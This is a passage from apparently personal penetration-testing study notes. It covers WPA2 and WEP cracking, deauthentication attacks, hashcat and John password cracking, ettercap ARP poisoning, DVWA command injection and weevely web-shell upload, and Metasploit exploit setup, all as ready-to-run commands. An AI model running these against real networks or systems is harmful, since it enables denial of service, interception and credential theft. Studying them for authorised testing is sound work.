* Map with WiFi Analyzer + Bluetooth Apps on Phone.

```bash
sudo airmon-ng start wlan0 6
```

```bash
tshark -i wlan0mon -f "wlan type mgt subtype probe- req" -w <sitename>
```

# (4) Wireless Authentication and Password Cracking

* Types of Authentication:
  * Open System Authentication
  * Shared Key Authentication (SKA)
  * Extensible Authentication Protocol (EAP)
  * Simultaneous Authentication of Equals (SAE) & Opportunistic Wireless Encryption (OWE)

## Wireless Security Standards

* WIRE EQUIVALENT PROTECTION (WEP): uses RC4 encryption, due to the processing of computers now, WEP is very WEAK!
  * KEY SIZES:
    * 64-bit key (40-bit secret key + 24-bit Initialization Vector) = 10 Hex
    * 128-bit key (104-bit secret key + 24-bit Initialization Vector) = 26 Hex
    ![[WEP Diagram.png]]

* WEP AUTHENTICATION
  * Shared Key Authentication
    * Requires Challenge and Handshake verification before joining the WAP
    * 4 authentication frames are exchanged between the WAP and STA
      * Can be identified in wireshark using `<wlan.fc.type_subtype == 11>`

        1. STA : Request to authenticate (SEQ 1)
        2. WAP : Answer this challenge (PT) (SEQ 2)
        3. STA : Submits response to challenge (CT) (SEQ 3)
        4. WAP : Success or failure (SEQ 4)

* WIFI PROTECTED ACCESS (WPA)
  * Uses Temporal Key Integrity Protocol (TKIP) with RC4 encryption for security
  * 128-bit Key (Dynamic, per packet keying)
  * Introduction of the Message Integrity Check (MIC)
  * Includes a 4-way handshake introduced to strengthen session key

* WIFI PROTECTED ACESS 2 (WPA2) AUTHENTICATION
  * Replaced the following from WPA:
    * TKIP with Counter Mode Cipher Block Channing Message Authentication Code Protocol (CCMP)
    * RC4 encryption with Advanced Encryption Standard (AES) for security

  * WPA/2 has two modes of authentication:
    * Pre-Shared Key (PSK) = Typically home use, “Wi-fi password”
    * Enterprise = Typically deployed in a business environment with a RADIUS server using certificates
  * Extensible Authentication Protocol (EAP): implemented in IEEE802.11i (Robust Security Network Association (RSNA))
  * Various EAP methods (LEAP, PEAP, EAP TLS, EAP TTLS)
    * Both methods are used in conjunction with Open System Authentication

* WPA2 4 WAY HANDSHAKE:
  * NOTE:
    * Message #3: Key Installation (GTK + MIC) isn't always needed in the 4-way handshake
    * MANAGEMENT FRAMES ARE UNENCRYPTED! (Identify that management frame protection is unencrypted)

* OBTAINING WPA2 HANDSHAKES:
  * MANAGEMENT FRAMES ARE UNENCRYPTED! (Identify that management frame protection is unencrypted)
    * Most common methods to force a handshake between client and AP:
            1. Deauthentication: ESSENTIALLY continual DoS
            2. Dissassociation: used to disconnect clients when AP is powering down, rebooting, or leaving the area

## Deauthentication Attack

* AIREPLAY-NG

    ```bash
    sudo aireplay-ng -0 -0 -a <BSSID> -c <target BSSID> (wlan#mon)
    ```

  * `-a`: AP
  * `-c`: client

* WIFI PROTECTED ACCESS 3
  * Relies on AES for encryption
    1. Opportunistic Wireless Encryption
    2. Utilizes Simultaneous Authentication of Equals (SAE) instead of PSK
        1. Helps eliminate repetitive use of encryption keys and limits on site authentication attempts

* WPA3 Opportunistic Wireless Encryption (OWE):
  * Provides "Individualized Data Protection"
  * Certified as Wi-Fi Certified Enhanced Open
    ![[WPA3 OWE.png]]

## Cracking WPA2

* GENERAL PROCESS:
    1. Discover target network
        1. Gather details (CH, BSSID, MAC, ESSID)

    2. Collect Handshake
        1. Passive – Time and Place
        2. Active – Force a reconnection

    3. Crack Passphrase
        1. Dictionary, brute force, rainbow tables

    4. Do work
        1. Decrypt traffic -OR- join network

### Airmon Setup

```bash
airmon-ng stop wlan#mon
airmon-ng check kill
airmon-ng start wlan# 6 - force channel to 6
```

### Target Discovery

```bash
airodump-ng ––band abg wlan#mon
```

NOTE: POWER SHOULD BE HIGHER THAN -58

### Target Collection

```bash
airodump-ng –c# wlan#mon
airodump-ng --bssid <BSSID> –c# wlan#mon
```

### Passive Handshake Collection

```bash
airodump-ng --bssid –c# –w <output> wlan#mon
```

NOTE: Look at the top right and WAIT for "WPA HANDSHAKE" to appear

### Active Handshake Collection

Only use when there's NO client communication and no HANDSHAKE are being transferred (e..g, I missed the handshake)

### Deauthentication Attack for Handshake Collection

```bash
aireplay-ng --deauth=(1-7) -a <MAC> -c <BSSID_MAC> wlan#mon
```

* `-0`: de-auth attack
* `1-7`: count (# of de-auth packets that you want to send)
  * ensure that you don't sent too many packets (very suspect if you do!)
* `-a`: (Source Address) BSSID/WAP of Access Point MAC
* `-c`: (Client) destination MAC address

### Verify the Handshake

Within wireshark filter for: `<eapol>`
Identify the 4 messages present!

### Handshake Troubleshooting

If multiple handshakes exist:
    Mark the 1 handshake with EAPOL protocol > export specified packets (file > export)

### Handshake Cracking

#### Tshark

```bash
tshark -r <.pcap> -Y "eapol || wlan.fc.type_subtype == 8" -w <output.pcap>
```

#### Aircrack-ng

```bash
aircrack-ng -w <dictionary.txt> <file.pcap>
```

* `-e=ESSID` (optional to filter)
* `-b=SSID` (optional filter)

## Stripping Encryption from PCAP

```bash
airdecap-ng <options> <file.pcap>
```

* `-b`: bssid
* `-e`: ssid
* `-p`: passphrase

## Wireshark Decryption

`Edit > Preferences > Expand Protocols > IEEE802.11 > Enable Encryption > Edit Keys`

## WLAN Connection via CLI

### Adding WAP Credentials

```bash
sudo wpa_passphrase 'SSID' 'password' >> /etc/wpa_supplicant/wpa_supplicant.conf
```

1. SSID/password = gathered from further investigation and intel

```bash
sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
```

1. HIDDEN SSID: `scan_ssid=1`

### Connecting the Adapter

```bash
sudo wpa_suplicant -B -c  /etc/wpa_supplicant/wpa_supplicant.conf/ -i wlan#
```

### Obtaining IP Address

```bash
sudo dhclient wlan#
```

### Verifying Connection

```bash
sudo watch -d -n 1 iwconfig wlan#
sudo watch -d -n 1 ifconfig wlan#
```

### WLAN Disconnection

```bash
sudo dhclient wlan# -r
sudo ip link set wlan# down
```

### Removing Old WPA Supplicant Configuration

To avoid inadvertent probing to older networks:

```bash
sudo rm /etc/wpa_supplicant/wpa_supplicant.conf
```

## Defeating WEP

### Discovering Target Network

```bash
airodump-ng –band ab wlan#mon
airodump-ng --bssid <target MAC> -c# wlan#mon
```

### Collecting Initialization Vectors (IVs)

#### Passive IV Collection

```bash
airodump-ng --bssid <target MAC> -c# wlan#mon -w <output>
```

#### Active IV Collection

Used when WAP is using WEP but little or no traffic
[How to Crack WEP with no Clients](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)

#### Using Four Windows for Active Collection

1. **AIRODUMP**

    ```bash
    airodump-ng --bssid <target MAC> -w <output>
    ```

    NOTE: You need a minimum amount of 5000 Initialization Vectors (IVs) to crack WEP

2. **FAKE AUTH** = USE WHEN THERE'S LIMITED DATA

    ```bash
    aireplay-ng -1 <delay# (1-4)> –a <BSSID> -h <Host MAC> <interface>
    ```

    1. `-1` or `--fakeauth`: fake authentication with AP
    2. `-a`: set Access Point MAC Addresses
    3. `-h`: your host MAC Addresses

        ```bash
        ip a
        ```

    4. NOTE: WHEN YOU SEE "ASSOCIATION SUCCESSFUL" MOVE TO ARP REPLAY!!

3. **ARP REPLAY** = USE WHEN THERE'S LIMITED DATA

    ```bash
    aireplay -ng -3 -b <BSSID> -h <host MAC (top talker)> wlan#mon
    ```

    1. `-3` or `--arpreplay`: ARP replay attack (used to generate traffic)
    2. `-b`: BSSID from airodump output
    3. `-h`: host MAC with the most frames (TOP TALKER) sent under "STATION"

4. **DEAUTH/AIRCRACK**

    ```bash
    aircrack-ng <file.pcap>
    ```

### Supplicant Files for WEP

#### Adding WEP Credentials

```bash
sudo wpa_passphrase 'SSID' 'password' >> /etc/wpa_supplicant/wep.conf
```

```bash
sudo nano /etc/wpa_supplicant/wep.conf
```

1. `ssid="your SSID"`
2. `key_mgmt=NONE`
3. `wep_key0=<your key>`
4. `wep_tx_keyidx=0`

### For Open WEP Credentials

```bash
sudo nano /etc/wpa_supplicant/wep.conf
```

1. `ssid="your SSID"`
2. `key_mgmt=NONE`

### Connecting the Adapter

```bash
sudo wpa_suplicant -B -c  /etc/wpa_supplicant/wep.conf -i wlan#
```

## Hashcat

[Hash Cat Rule Based Attacks](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

```bash
hashcat --help | grep -i <HASH>
```

```bash
hashcat -a0  -m500 -D1,2 -O --force --username <file_to_crack.hash> <wordlist.txt> --show
```

* `-a`: attack mode
* `-a0`: straight dictionary mode using wordlist that I have in a text document
* `-a1`: combination
* `-a3`: brute-force (mask attack)
* `-a6`: hybrid wordlist + mask
* `-a7`: hybrid mask + wordlist

* `-m`: hash type (see `hashcat --help` for more)
  * `-m 0`: (straight MD5)
  * `-m 1000`: (NTLM, old, fast, Windows hashes)
  * `-m0`: (MD5)
  * `-m100`: (SHA1)
  * `-m1400`: (SHA256)
  * `-m1700`: (SHA512)
  * `-m 2500`: (WPA – eapol)
  * `-m 10500`: (pdf version 1.6)
  * `-m 13721`: (veracrypt)
  * `-m 16800`: (WPA – PMKID)

  * `-D`: device you want to used (e.g., `1=CPU 2=GPU`)
  * `-O`: used to math optimize passwords less than 15 characters
  * `--force`: used to ignore warning
  * `--username`: used to specify usernames at the beginning of lines (ONLY IF USERNAME IS PRESENT)
  * `-b` or `--benchmark-all`: used to test cracking speed
  * `--show`: add to the end of the hashcat syntax to see if it's present
  * `--left`: shows the remaining hashes in your list that need to be cracked still

## Identifying Hash

```bash
hashid *ENTER*
```

    Paste `<hash string>`

```bash
hash-identifier <hash string>
```

Search online hash identifier

## File Locations of Interest

POTFILE: `/home/<user>/.local/share/hashcat/hashcat.potfile`
WORDLISTS: `/usr/share/wordlists`
HASH LISTS: `/etc/shadow`
BRUTE FORCE MASKS: `/usr/share/hashcat/masks`

## Hashcat Rules

Location:

```bash
cd /usr/share/hashcat/rules
```

Search: hashkiller-dict [Hashcat Killer Dictionary](https://hashkiller.co.uk/ListManager/Download)

### Using Specific Rule File

```bash
hashcat –m500 -a0 -D1,2 -O --force --username <hash list> <wordlist> –r /usr/share/hashcat/rules/<rule file>
```

* `-r`: used to apply the whole rule file to a password list

### Using a Single Line Rule

```bash
hashcat –m500 -a0 -D1,2 -O --force --username <hash list> <wordlist> –j '<rule>' --show
```

* `-j '<rule>' --stdout > <file.txt>`: used if you want a single line rule
  * `-j 'c'` = capitalize every password
  * `-j 'c sa@ss5soO'`
    * `sa@` = substitute a for @
    * `ss5` = substitute s for 5
    * `so0` = substitute o for 0

### Single Line Rules Reference

[Hashcat Documentation](https://hashcat.net) = used as a reference for single line rules to mangle candidates from the wordlist

### Custom Rule Creation

```bash
cd /usr/share/hashcat/rules
nano <custom rule>
```

    `:` = no formatting
    `c` = capitalize the first letter
    `$1` = append "1"
    `$1 $2 $3`
    `c $1`
    `c $1$2$3`

### Mangling and Sorting Word Lists

```bash
hashcat  -a0  <hash list> <wordlist> -r  /path/to/custom/rule --stdout > <file.txt>
```

```bash
hashcat -a0 <wordlist.txt> -j '<custom rule list>' --stdout > <new-file.txt>
```

```bash
hashcat -a0 <wordlist.txt> -r /path/to/rules --stdout >> <new-file.txt>
```

```bash
hashcat -a0 -m500 -D1,2 -O --force --username <list-to-break.hash> <custom-wordlist.txt>
```

NOTE: `>` redirect `>>` = append to the end of your wordlist

```bash
sort file.txt | uniq -u > file-uniq.txt
```

### Combination Attack (-a1)

NOTE: Be sure to keep the wordlist in the specific order that is stated to keep the order of the words correct!

```bash
hashcat -a1 word1.txt words2.txt -j 'c' -k 'c' --stdout > combowords.txt
```

* `-a1`: combination attack
* `-j`: left wordlist
* `-k`: right wordlist
* `'c'`: capitalize first letter

```bash
hashcat -a0 -m500 -D1,2 -O --force --username <list-to-break.hash> <combo-word-uniqe.txt> --stdout >>
```

### Brute Force Attack (-a3)

```bash
hashcat -a3 -m500 -D1,2 -O --force --username <list-to-break.hash> <character set #> -w4
```

`?l` = lowercase
`?u` = uppercase
`?d` = digits
`?h` = lowercase hex `[0-9a-f]`
`?H` = uppercase hex `[0-9A-F]`
`?s` = printable special characters
`?a` = upper, lower, digits, specials

```bash
hashcat -a3 -m500 -D1,2 -O --force --username <list-to-break.hash> -1 ?u?l ?1?1?1?1?1?1
```

* `-1`: defines our character sets referenced with `?1`
* `?1`: place holder for upper or lowercase values
* `?u`: uppercase
* `?l`: lowercase

```bash
hashcat -a3 -m500 -D1,2 -O --force --username <list-to-break.hash>  -1 '!@#$' ?u?l?l?l?1
```

### Pre-configured Brute Force Masks

```bash
hashcat -a3 -m500 -D1,2 -O --force --username ~/hashcat/masks/rockyou*
```

### Hybrid Attack

`-a6` = append characters wordlist
`-a7` = prepend characters to wordlist

NOTE:
`-a6` (APPend) = mask goes AFTER `<wordlist>`
    `<MASK.txt> ?d?d?d?d?d?d`

`-a7` (PREpend) = mask goes BEFORE `<wordlist>`
    `?d?d?d?d?d?d <MASK.txt>`

### Append Attack

```bash
hashcat -a6 -m500 -D1,2 --username --force <hash.hash> <wordlist.txt> ?d?d?d
```

### Prepend Attack

```bash
hashcat -a7 -m500 -D1,2 --username --force <hash.hash> ?d?d?d <wordlist.txt>
```

### Hashcat with WPA Passwords

(NOTE: maximum length for WPA pass = 8 characters)

### Capturing WPA Handshake

SEE ABOVE FOR CAPTURE PROCESS

```bash
aircrack-ng -w <generated-file> <capturefile.cap>
```

### Converting Capture File to Hashcat Format

```bash
git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
make
```

```bash
hashcat-utils/bin/cap2hccapx.bin input.cap output.hccapx
```

Will produce a hash for every handshake in the input.cap file

### Hydra

Useful for logging into password prompts

```bash
sudo apt install hydra
```

```bash
hydra -l <username> -P <words.txt> <Target IP> <service> -s <PORT#>
```

* `-l`: username
* `-L`: list of usernames
* `-p`: exact password
* `-P`: password dictionary file
* `-s`: defines what port you want to access if non standard

## Custom Wordlist Generator (CeWL)

Automated wordlist generator used for scrapping key words and other information that can be used for our password cracking (OSINT)

```bash
cewl -w <customfile.txt> -d <#> -m <#> -e <URL>
```

* `-w`: output file
* `-d`: depth the spider will go (essentially how many links deep)
* `-m`: minimum length of words to scrape
* `-e`: used to scrape email addresses as well

## Wordlist Trimming

Used to save time and cut down the amount of time it takes to crack hashes

```bash
pw-inspector -m <#> -M <#> -i <word.list> -o <trimmed.word.list>
```

* `-m`: minimum number of words
* `-M`: maximum number of words
* `-i`: word list that you want to trim down
* `-o`: final trimmed list of words

## Crunch

Creates wordlists based on user specified criteria (e.g., number combos and mangling)
Useful for after you gather quality OSINT from website

```bash
crunch <min-len> <max-len> <string of characters> -o <file.txt>
crunch 3 3 abc -o file.txt
```

* `3`: minimum length
* `3`: maximum length
* `abc`: characters that you want to mangle
* `-o`: output file

```bash
crunch 13 13 -t  (910)420-%%%%
```

* `-t`: specifies a pattern of special characters (`@,% ^`)
  * `@` = lowercase characters
  * `,` = insert uppercase characters
  * `%` = insert numbers
  * `^` = insert symbols

## MDK4

WiFi testing tool from E7mer from aircrack-ng
VERY LOUD

SEE: `mdk4 --fullhelp` for additional options!

```bash
sudo mdk4 wlan#mon <attack mode> <attack options>
sudo mdk4 wlan#mon -d -c channel#
```

* `-d`: general disassociation attack
* `-b`:
* `-x`:
* `-c`:

## PMKID Attacks

KRACK REINSTALLATION ATTACKS

```bash
sudo apt install hcxtools
```

`hcxpcapdumptool` = similar to airodump-ng and will collect pcap data and overhead data needed to complete PMKID attack
`hcxpcapngtool` = converts hcxdumptool pcap data into raw hash from crack

## HCXDUMPTOOL

```bash
sudo hcxdumptool -I
```

* `-I`: identifies wireless adapters (`wlan#`)

```bash
sudo hcxdumptool -i <wlan#>
```

Used to list all available frequencies baed on wireless radio capabilities

```bash
sudo hcxdumptool --do_rscan -i <wlan#>
```

Used to complete a Radio Channel Assesment (RCA) scan to learn BSSID/CH/ESSID

```bash
sudo hcxdumptool -i wlan# -o <output.file> --enable_status=3 --filtermode=2 --filterlist_ap=<BSSID>
```

`--enable_status=3`: EAPOL/Association/Reassociation
`--filtermode=2`: used as a filter list since target list will only interact with access points and clients
`--filterlist_ap=<BSSID or list>`: include list of BSSIDs in a `.txt` file or a single BSSID

## HCXPCAPNGTOOL

Conversion of hcxdumptool pcap into a hash file

```bash
hcxpcapngtool -o <output filepcapng>  <capture.pcap>
```

## Cracking WPA Handshakes from HCXTOOLs

```bash
hashcat -m 22000 -w 3 <output file> <wordlist.txt/rule>
```

## WPA Rainbow Tables Example

Are pre-computed hash files that are generated against a network SSID

## Trimming Wordlist

```bash
pw-inspector -i <word.list> -o WPAword.list -m 8 -M 63
```

## Creating Rainbow Table with GenPMK

```bash
genpmk -f WPAword.list -s "SSID" -d <WPA-rainbow.txt>
```

## Cracking .PCAP with Cowpatty

```bash
cowpatty -d <WPA-rainbow.txt> -s "SSID" -r <collection.pcap>
```

## John the Ripper

Open source password security auditing and password recovery tool for OSs using native password.list

### Installation

```bash
sudo apt install libcompress-raw-lzma-perl
sudo apt install john
```

### Scripts for John

```bash
ls /usr/share/john
```

### Basic Usage

```bash
john --wordlist=<word.list> --format=raw-* <hash or list.hash>
```

`raw-*` = running all hashsums (md5, sha128, 256, etc.)

### Cracking Encrypted Files

#### Decrypting Files Using John

```bash
<filetype>2john <filename> > <newfile>
```

#### Cracking 7z Files

```bash
7z2john <file.txt> > <new.7z>
john <new.7z> --wordlist=/path/to/word.list
john <new.7z> --show
7z e <new.7z>
```

*enter password*

#### Cracking PDF Files

```bash
pdf2john <file.pdf> > new.pdf
john <new.pdf> --wordlist=/path/to/word.list
john <new.pdf> --show
open <new.pdf>
```

*enter password*

STORED IN `~/.john` FILE!

## WPS Attacks

WASH
    a monitoring tool used to detect routers running WPS

REAVER AND BULLY
    WPS attack tools

Both WASH, REAVER and BULLY are used for brute force attacks.

## On Path Attack (Man-in-the-Middle)

Tools used to implement on path attacks:
    Cain and Abel
    Subterfuge
    Ettercap
    AirJack

## ARP Poisoning

Translates IP addresses into MAC addresses, only works so long as you're on the same network!

ESSENTIALLY: impersonating the MAC and IP of two targets that we are trying to retrieve data from. The router is unable to differentiate who is who and allows traffic to be sent

## Ettercap

[Ettercap Walkthrough](https://www.comparitech.com/net-admin/ettercap-cheat-sheet/)

### Installation

```bash
sudo apt install ettercap
sudo ettercap -G or -T
```

`-G` = GUI
`-T` = Terminal

#### GUI Steps

1.

```bash
sudo ettercap -G
```

2. Select `wlan#` to place in monitor mode
3. Scan for hosts (magnifying glass)
4. Identify you IP in the list of IP addresses that are discovered
5. Select IP > Target 1
6. Select IP > Target 2
7. Select Options (MITM, ARP Poison, etc.)
    1. *Poison Both Ways*
8. Wireshark > select `wlan0` interface > monitor live traffic

#### Terminal Steps

1.

```bash
sudo ettercap -T
```

2.

```bash
sudo ettercap -Tq -i wlan# -M arp:remote //<service>/ //<ip address>/
```

 1. `-T` = terminal mode
 2. `-M` = mitm
 3. `arp:remote` = implements arp poisoning mitm attack
 4. `-q` = "quiet mode", contents are not displayed on the screen

# (5) Basic Attacker Frameworks and Logical/Physical Penetration Testing

**References:**

* [OSCP Playbook](https://fareedfauzi.gitbook.io/oscp-playbook/)
* [Rev Shells](https://revshells.com)
* [OpenVAS Vulnerability Scanner](https://hackertarget.com/openvas-scan/)

## Basic Web Application Penetration Testing Example SOP

### Browse the Site Manually

spider/crawl the site

* OSINT, Google Dork Scans, Shodan, etc.

### Fingerprint Web Server

* Determine the type of Web Server
* Find version details of Web Server

* ```bash
  nmap -Pn -n -T4 -v -sV --http-script=XX <IP.address> -p#
  ```

### Look at Metafiles

* Robots.txt
* Sitemap.txt
* humans.txt
* security.txt

### Enumerate Webserver Applications

* Nmap
* Netcat

### Review Web Contents

* Inspect page source for sensitive info
* Look for sensitive javascript
* Search for keys
* Check if auto complete is disabled

### Identify Application's Entry Points

* OWASP Attack Detector
* Archni

### Map Execution Paths

* Zap Proxy
* Burp Suite
* Dirbuster
* FFUF
* Dirb
* Gobuster

### Fingerprint Web Application Framework

* Use Wappalyzer
* Whatweb
* View URL extensions
* View HTML source code
* View cookie parameters
* View HTTP headers

## Personal Range Setup

* Download ISO of Metasploitable VM
* Download ISO of Windows 7
* Download ISO of Windows XP

## Reconnaissance

## Recon (Live Hosts)

* ```bash
  fping -a -g X.X.X.0/X 2> /dev/null > <file.txt>
  ```

  * `-a`: alive hosts
  * `-g`: generation of IP address

* ```bash
  hostname -I
  ```

  * `-I`: verifies your IP address on machine

* NOTE: remove your IP and GW

* ```bash
  sudo arp-scan -l
  ```

* ```bash
  sudo netdiscover -i <eth#/> -r <IP.address>/X
  ```

* ```bash
  sudo nmap -sn -n -v <IP.address>/X -oG - | awk '/Up$/{print $2}' > <file.txt>
  ```

  * `-sn`: ping sweep
  * `-n`: no DNS resolution

* ```bash
  for i in {subnet#..subnet#}; do (ping -c 1 XX.XX.XX.$i | grep "bytes from" &); done | awk '{print $4}'
  ```

## Recon I (Verify Live Hosts)

* ```bash
  unicornscan -mTsf -Iv -r 1000 X.X.X.0/24
  ```

  * `-mT`: specify TCP flags; sf: TCP connect scan
  * `-r`: packes per second
  * `-Iv`: immediate mode (display as we find); v: be verbose

* ```bash
  sudo masscan X.X.X.0/24 -p# --rate=# --interface eth#
  ```

## Recon II (Enumerate)

NOTE: GOLDEN 4 (`-Pn -n -v -T4`)

* ```bash
  nmap -Pn -n -v -T4 -iL <IP.list> --open
  ```

  * `-Pn`: no probe/ping, skip host discovery
  * `--open`: scan open ports first
  * `-iL`: input list

* ```bash
  nmap -Pn -n -v -T4 -sV <IP.address> --version-all -p#
  ```

  * `--version-all`: aggressive guessing

* ```bash
  nmap -Pn -v -n -T4 -A/-sC/--script=XX <IP.address> -p#
  ```

  * `-sC`: default nmap scripting engine scripts
  * `-A`: OS, version, script scan, trace-route (LOUD)
  * `--script=XX`: choose your script

## Recon III (Common Services)

SCRIPT LOCATION: `$ /usr/share/nmap/scripts`

* FTP

  * ```bash
      ftp <IP.address>
      ```

    * anonymous:anonymous@anonymous.com

  * BROWSER: `ftp://<IP address/>`

* HTTP/S

  * ```bash
      dirb http://<IP.address>
      ```

  * ```bash
      gobuster -e -u <URL/> -w <word.list>
      ```

  * ```bash
      python crawlbox.py <URL/> -w <word.list>
      ```

  * ```bash
      ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://<IP.address>/~FUZZ'
      ```

  * ```bash
      nmap -Pn -v -sV --script=http-enum -p# <IP.address>
      ```

* SMB

  * ```bash
      nmap -Pn -n -v -T4 -sV --script="*smb-vuln-ms*" -p 445 <IP.address>
      ```

  * ```bash
      enum4linux -v <IP.address>
      ```

  * ```bash
      smbclient -L \\<IP.address>
      ```

## Recon IV (Research Exploits via ExploitDB)

* ```bash
  sudo apt update
  ```

* ```bash
  searchsploit <open.service>
  ```

* ```bash
  serachsploit -x <exploit#>
  ```

  * `-x`: examine

* ```bash
  searchsploit -m <exploit#>
  ```

  * `-m`: mirror the executable script and outputs path to where script is stored

  * ```bash
      python3 <exploit#.py> <IP.address>
      ```

* ```bash
  searchsploit -t redhat
  ```

* ```bash
  searchsploit redhat -exclude="(PoC) | /dos/"
  ```

## Recon V (Gathering Results)

* ```bash
  xsltproc <xml.file> -o <file.html>
  ```

  * outputs a more user friendly web browser output

### Findsploit

* ```bash
  git clone [https://github.com/1N3/findsploit](https://github.com/1N3/findsploit)
  ```

* ```bash
  cd findsploit && chmod +x install.sh && sudo ./install.sh
  ```

### Pompem

* ```bash
  git clone [https://github.com/rfunix/Pompem.git](https://github.com/rfunix/Pompem.git)
  ```

* ```bash
  cd Pompem && sudo pip3.# -r requirements.txt
  ```

* ```bash
  python3.5 pompem.py -s '<string/>' --html
  ```

  * `-s`: search keyword

## Online Resources

* [Vulners Vulnerability Database](https://vulners.com)
* [Rapid7 Vulnerability Database](https://www.rapid7.com/db/)
* [CXSecurity Exploit Archive](https://cxsecurity.com/exploit/)
* [Shodan Exploits Database](https://exploits.shodan.io/)
* [Sploitus Exploit Search Engine](https://sploitus.com/)

## Weaponization Stages

DELIVERY
EXPLOITATION
INSTALLATION
C2
ACTIONS ON OBJECTIVES

## Docker Playgrounds

### Docker: Damn Vulnerable Web Application (DVWA) Playground

* Damn Vulnerable Web App (DVWA): open source training tool with builtin scenarios covering the OWASP Top 10 Vulns.

* ```bash
  sudo apt install docker*
  ```

* ```bash
  docker --version
  ```

* ```bash
  sudo usermod -aG docker $USER
  ```

* ```bash
  git clone [https://github.com/digninja/DVWA.git](https://github.com/digninja/DVWA.git)
  ```

* ```bash
  docker run --rm -td -p80:80 --name dvwa vulnerables/web-dvwa
  ```

  * `-t`: terminal
  * `-d`: docker
  * `-p80:80`: container:kail port connection
  * `--name`: specifies the shortened name of "dvwa"

* Navigate to `http://127.0.0.1:80`

### Docker: Mutillidae Playground

* ```bash
  sudo apt install docker*
  ```

* ```bash
  docker --version
  ```

* ```bash
  sudo usermod -aG docker $user
  ```

* ```bash
  git clone [https://github.com/webpwnized/mutillidae-dockerhub.git](https://github.com/webpwnized/mutillidae-dockerhub.git)
  ```

* ```bash
  cd mutillidae-dockerhub
  ```

* ```bash
  sudo docker-compose up
  ```

* BROWSER: `127.0.0.1`
  * Mutillidae Walk Through (<https://youtu.be/zneRNme9h3U>)

## Burpsuite GUI

* Web Application Testing

### Brute Force Example

* Proxy > Intercept > Turn Intercept On > Open in Browser > 127.0.0.1 (docker IP address that is assigned)
* Enter Fake Credentials > Right-click output and send to intruder (CTRL+I)
* Highlight Password > Add > Payloads > Load Dictionary > Run
  * Look for any behavior that may indicate a valid password. For example, look for any anomalous error messages, response times, or status codes. (e.g., of the requests has received a 302 response)

### Command Injection Example

* `; id && pwd && whoami && uname`
* `; ip a | grep inet`

### File Upload for Shell Example

* ```bash
  weevely generate <password/> <file.php>
  ```

* Upload your file

* ```bash
  weevely http://127.0.0.1/hackable/uploads/fake.php <password>
  ```

* Generation of Reverse Shells
* PHP PenTestMonkey

## OWASP Zed Attack Web Proxy (ZAP)

* Open-source penetration testing tool, designed for testing web-applications, known as a "man-in-the-middle proxy"
* READ-ONLY and provides potential links/sites of interest!

* Basic Drill Down
  * Quick Start > Automated Scan > URL to Attack (Vuln URL) > Use Traditional Spider > Use Ajax Spider w/ (Browser of Your Choice)

## Arachni

* Used to assist penetration testers and admins evaluate security of web applications
* Can be used to take into account dynamic web applications, can detect changes caused
* Graphic display and color coding of potential vulnerabilities

* ```bash
  wget -q https://github.com/Arachni/arachni/releases/download/v1.6.1.3/arachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz
  ```

* ```bash
  tar -xvf arachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz
  ```

* ```bash
  cd arachni-1.6.1.3-0.6.1.1/bin
  ```

* ```bash
  bash arachni-web
  ```

  * CREDS: <admin@admin.admin>:administrator

## Metasploit Setup and Basics

### Setup for New Machine

* ```bash
  sudo apt update; sudo apt upgrade
  ```

* ```bash
  service postgresql start; service postgresql status; msfdb init
  ```

### Troubleshooting

* ```bash
  sudo msfdb reinit
  ```

  * Wipes out the previous msfconsole instances

* ```bash
  msfconsole
  ```

### Metasploit Basic Commands

* ```bash
  help <command>
  ```

* ```bash
  search <vuln.service>
  ```

  * ```bash
      info exploit.#
      ```

### Importing and Exporting within Metasploit

* ```bash
  workspace -a <custom.workspace>
  ```

  * Generate a custom workspace for your session
  * Can act as a back up of data for your current working environment

### Exporting

* ```bash
  db_export -f <format.type> <file.name>
  ```

### Importing

* ```bash
  sudo msfconsole
  ```

* ```bash
  db_import <file.name>
  ```

* ```bash
  workstation <file.name>
  ```

* ```bash
  back
  ```

  * Used to go back into to the initial metasploit path

### MSFCONSOLE Modules

* 1 / 2 / 3 / 4
* Type of Module/Platform/Targeted Service/Targeted Service Function
* exploit/linux/samba/chain_reply

### Metasploit Payloads

* Inline (singles) = contains a single the exploit and full shell code for the selected task. Made with Msfvenom, Veil, Powersploit, etc.. Can be caught with non-Metasploit handlers like netcat.
  * e.g., windows/shell_bind_tcp (a single payload with no stage)

* Stager = the actual mechanism that establishes the communication channel between you and the victim.

* Stage = works in conjunction with a stager to execute code on a remote host, provide advanced features with no size limits
  * e.g., windows/shell/bind_tcp
    * stager = bind_tcp
    * stage = shell

* Meterpreter = Meta-Interpreter, used for to deliver payload that operates via DLL injection

### Msfvenom

[Msfvenon Cheatsheet](https://www.offsec.com/metasploit-unleashed/msfvenom/)

**ESSENTIALLY**: a stand alone payload generator


### DB_NMAP: Metasploit Drill Down

#### From Metasploit

* Used to store your nmap scans within metasploit database

* ```bash
  db_nmap -sn -v -n -T4 <IP.address.range>
  ```

* ```bash
  db_nmap -n -Pn -v -sV -Pn --version-all <IP.address.range>
  ```

* ```bash
  hosts
  ```

* ```bash
  services -u <IP.address>
  ```

  * Outputs potential vulnerable services for that specific IP address

#### From Kali

* ```bash
  sudo nmap -n -v -Pn -T4 --script="XX" <IP.address> -p#
  ```

  * Identify possible vulnerabilities and choose specific target you want to attack

* ```bash
  sudo nmap -n -v -Pn -T4 --script="XX" <IP.address> -p# > <file.name>
  ```

* ```bash
  grep -B 5 -i vuln* <file.name>
  ```

#### From Metasploit (Exploit Selection)

* ```bash
  search vuln.value (e.g., ms08_, ms17, etc.)
  ```

* ```bash
  use vuln.#
  ```

#### Configuring the Exploit

* ```bash
  show options
  ```

  * Displays the required items that need to be filled (be sure to look at the REQUIRED column!)

* ```bash
  set RHOSTS <target.IP>
  ```

* ```
  set LHOST <eth#> OR <Kali.address>
  ```

  * NOTE: be sure to use different port numbers for each shell!

* ```bash
  set LPORT <port#>
  ```

* ```bash
  set payload#
  ```

* ```bash
  set SSL
  ```

  * SSL = true ONLY if you are unable to navigate to the web browser

* ```bash
  exploit/run
  ```

### Metasploit Exploit and Payload Management

* ```bash
  show targets
  ```

  * Displays all platforms the exploit will work on

* ```bash
  show payloads
  ```

  * Displays all payloads that can used with the respective exploit

